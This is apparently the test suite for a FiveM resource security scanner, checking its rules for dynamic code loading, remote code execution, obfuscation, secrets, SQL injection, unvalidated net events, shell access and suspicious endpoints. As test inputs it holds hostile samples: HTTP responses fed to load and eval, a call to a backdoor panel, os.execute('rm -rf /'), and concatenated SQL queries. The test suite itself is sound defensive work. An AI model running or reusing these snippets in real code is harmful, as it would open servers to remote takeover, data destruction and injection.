import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { findings, ids, only } from './helpers.ts';

describe('FA001 dynamic code execution', () => {
  it('flags load on runtime values', () => {
    const [f] = only('local fn = load(payload)\nfn()', 'FA001');
    assert.equal(f?.severity, 'medium');
    assert.equal(f?.line, 1);
  });

  it('escalates when the same file performs HTTP requests', () => {
    assert.equal(only('PerformHttpRequest(u, cb)\nlocal fn = load(payload)', 'FA001')[0]?.severity, 'high');
  });

  it('downgrades constant strings, bundled files and flags dofile', () => {
    assert.equal(only('load("return 1")', 'FA001')[0]?.severity, 'low');
    assert.equal(only("load(LoadResourceFile(GetCurrentResourceName(), 'tpl.lua'))()", 'FA001')[0]?.severity, 'low');
    assert.equal(only('dofile(path)', 'FA001').length, 1);
  });

  it('flags calls after keywords and concatenation', () => {
    assert.equal(only('if body then load(body)() end', 'FA001').length, 1);
    assert.equal(only("local s = 'x' .. load(y)", 'FA001').length, 1);
  });

  it('ignores methods, comments and strings', () => {
    assert.deepEqual(only('json.load(x)\nself:load(y)\n-- load(z)\nprint("load(w)")', 'FA001'), []);
  });

  it('flags eval and new Function in JS', () => {
    assert.equal(only('eval(code); const f = new Function(body);', 'FA001', 'js').length, 2);
    assert.deepEqual(only('obj.eval(x); // eval(y)', 'FA001', 'js'), []);
  });
});

describe('FA002 remote code execution', () => {
  it('detects HTTP responses passed to load', () => {
    const code = `PerformHttpRequest('https://x.y/z', function(err, body, headers)
  if body then load(body)() end
end, 'GET')`;
    const [f] = only(code, 'FA002');
    assert.equal(f?.severity, 'critical');
  });

  it('ignores HTTP requests that do not execute the response', () => {
    assert.deepEqual(only("PerformHttpRequest(url, function(e, body) print(json.decode(body)) end)", 'FA002'), []);
  });

  it('detects fetch followed by eval in JS', () => {
    assert.equal(only('fetch(u).then(r => r.text()).then(t => eval(t))', 'FA002', 'js').length, 1);
  });
});

describe('FA003 obfuscation', () => {
  it('reveals API names hidden in escaped strings', () => {
    const hidden = 'PerformHttpRequest'.split('').map((c) => `\\x${c.charCodeAt(0).toString(16)}`).join('');
    const [f] = only(`local k = "${hidden}"`, 'FA003');
    assert.equal(f?.severity, 'critical');
    assert.match(f?.message ?? '', /PerformHttpRequest/);
  });

  it('decodes string.char chains', () => {
    const bytes = [...'loadstring'].map((c) => c.charCodeAt(0)).join(', ');
    const [f] = only(`local n = string.char(${bytes})`, 'FA003');
    assert.equal(f?.severity, 'critical');
  });

  it('flags computed global lookups but not plain ones', () => {
    assert.equal(only('_G[name]()', 'FA003')[0]?.severity, 'low');
    assert.deepEqual(only('_G["print"]("x")', 'FA003'), []);
  });

  it('ignores short or readable strings', () => {
    assert.deepEqual(only('local s = "line\\nbreak\\ttab"', 'FA003'), []);
  });
});

describe('FA004 hardcoded secrets', () => {
  const webhook = `https://discord.com/api/webhooks/123456789012345678/${'a1B2'.repeat(17)}`;

  it('detects webhooks and redacts them in the snippet', () => {
    const [f] = only(`Config.Webhook = "${webhook}"`, 'FA004');
    assert.equal(f?.severity, 'high');
    assert.ok(!f?.snippet.includes('a1B2a1B2a1B2'));
  });

  it('detects cfg license keys and connection string passwords', () => {
    const cfg = 'sv_licenseKey "cfxk_abcdefghijklmnopqrstuv_123456"\nset mysql_connection_string "mysql://root:Sup3rS3cret@localhost/db"';
    const found = only(cfg, 'FA004', 'text');
    assert.equal(found.length, 2);
    assert.ok(found.every((f) => !f.snippet.includes('Sup3rS3cret') && !f.snippet.includes('abcdefghijklmnop')));
  });

  it('flags generic secrets but skips placeholders', () => {
    assert.equal(only('local apiKey = "k9X2mQ7vL4pZ8rT1"', 'FA004').length, 1);
    assert.deepEqual(only('local apiKey = "YOUR_API_KEY_HERE"\nlocal token = "changeme12345678"', 'FA004'), []);
  });
});

describe('FA005 SQL injection', () => {
  it('flags concatenated oxmysql queries', () => {
    const [f] = only("MySQL.query('SELECT * FROM users WHERE identifier = ' .. identifier, {})", 'FA005');
    assert.equal(f?.severity, 'high');
  });

  it('flags string.format and legacy exports', () => {
    assert.equal(only("MySQL.Async.fetchAll(string.format(\"SELECT * FROM x WHERE id = '%s'\", id))", 'FA005').length, 1);
    assert.equal(only("exports['oxmysql']:execute('DELETE FROM bans WHERE id = ' .. id)", 'FA005').length, 1);
  });

  it('accepts parameterized queries', () => {
    assert.deepEqual(only("MySQL.query.await('SELECT * FROM users WHERE identifier = ?', { identifier })", 'FA005'), []);
    assert.deepEqual(only("exports.other:execute('SELECT 1 ' .. x)", 'FA005'), []);
  });

  it('flags interpolated template literals in JS', () => {
    assert.equal(only('await MySQL.query(`SELECT * FROM users WHERE id = ${id}`)', 'FA005', 'js').length, 1);
    assert.deepEqual(only('await MySQL.query(`SELECT * FROM users WHERE id = ?`, [id])', 'FA005', 'js'), []);
  });
});

describe('FA006 unvalidated net events', () => {
  const exploitable = `RegisterNetEvent('shop:buy', function(item, amount)
  local xPlayer = ESX.GetPlayerFromId(source)
  xPlayer.addInventoryItem(item, amount)
end)`;

  it('flags client values flowing into economy sinks', () => {
    const [f] = only(exploitable, 'FA006');
    assert.equal(f?.severity, 'high');
    assert.match(f?.message ?? '', /"item", "amount"/);
    assert.equal(f?.line, 3);
  });

  it('lowers severity when the handler validates first', () => {
    const guarded = exploitable.replace('  xPlayer.addInventoryItem', '  if amount > 0 and amount <= 10 then return end\n  xPlayer.addInventoryItem');
    assert.equal(only(guarded, 'FA006')[0]?.severity, 'medium');
  });

  it('supports RegisterServerEvent + AddEventHandler', () => {
    const code = "RegisterServerEvent('pay')\nAddEventHandler('pay', function(n)\n  Player.Functions.AddMoney('cash', n)\nend)";
    assert.equal(only(code, 'FA006').length, 1);
  });

  it('ignores local events, client files and server-computed values', () => {
    assert.deepEqual(only("AddEventHandler('pay', function(n) xPlayer.addMoney(n) end)", 'FA006'), []);
    assert.deepEqual(only(exploitable, 'FA006', 'lua', 'client'), []);
    assert.deepEqual(only("RegisterNetEvent('job:pay', function()\n  xPlayer.addMoney(Config.Salary)\nend)", 'FA006'), []);
  });

  it('handles onNet in JS', () => {
    assert.equal(only("onNet('give', (amount) => { player.addMoney(amount); });", 'FA006', 'js').length, 1);
  });
});

describe('FA007 system access', () => {
  it('flags shell access', () => {
    const found = only("os.execute('rm -rf /')\nlocal p = io.popen(cmd)", 'FA007');
    assert.deepEqual(found.map((f) => f.severity), ['critical', 'critical']);
  });

  it('flags built ExecuteCommand calls only', () => {
    assert.equal(only("ExecuteCommand('add_ace group.admin ' .. id)", 'FA007')[0]?.severity, 'high');
    assert.deepEqual(only("ExecuteCommand('ensure myresource')", 'FA007'), []);
  });

  it('flags child_process in JS but not in comments', () => {
    assert.equal(only("const { exec } = require('child_process');", 'FA007', 'js').length, 1);
    assert.deepEqual(only("// require('child_process')", 'FA007', 'js'), []);
  });
});

describe('FA008 suspicious endpoints', () => {
  it('flags known panels, paste sites and raw IPs', () => {
    const found = only("PerformHttpRequest('https://cipher-panel.me/_i/i?to=x', cb)\nlocal u = 'https://pastebin.com/raw/abc'\nlocal ip = 'http://51.12.3.4:30120/x'", 'FA008');
    assert.deepEqual(found.map((f) => f.severity), ['critical', 'high', 'medium']);
  });

  it('ignores private addresses and normal hosts', () => {
    assert.deepEqual(only("local a = 'http://127.0.0.1:3000'\nlocal b = 'https://api.github.com'", 'FA008'), []);
  });
});

describe('FA009 legacy manifest', () => {
  it('flags __resource.lua', () => {
    assert.equal(only("resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'", 'FA009', 'lua', 'unknown', 'res/__resource.lua').length, 1);
  });
});

describe('suppression', () => {
  it('honours inline and previous-line ignores', () => {
    assert.deepEqual(ids('load(x) -- fivem-audit-ignore FA001'), []);
    assert.deepEqual(ids('-- fivem-audit-ignore\nload(x)'), []);
    assert.deepEqual(ids('-- fivem-audit-ignore FA004\nload(x)'), ['FA001']);
  });

  it('honours file-level ignores', () => {
    assert.deepEqual(findings('-- fivem-audit-ignore-file\nload(x)\nos.execute(y)'), []);
  });
});
